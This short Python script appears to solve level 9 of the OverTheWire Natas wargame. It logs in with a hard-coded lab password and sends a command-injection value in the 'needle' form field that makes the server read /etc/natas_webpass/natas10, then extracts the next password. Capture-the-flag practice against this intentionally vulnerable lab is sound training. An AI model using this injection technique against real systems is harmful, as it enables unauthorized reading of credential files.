import requests
import re

username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'

url = 'http://%s.natas.labs.overthewire.org/'%username
url1 = 'http://%s.natas.labs.overthewire.org/index-source.html'%username

response = requests.Session()
response = response.post(url , data={"needle" : ".* /etc/natas_webpass/natas10 ;" } , auth=(username,password))
content = response.text
flag = re.findall("/etc/natas_webpass/natas10:(.*)",content)[0]
print(flag)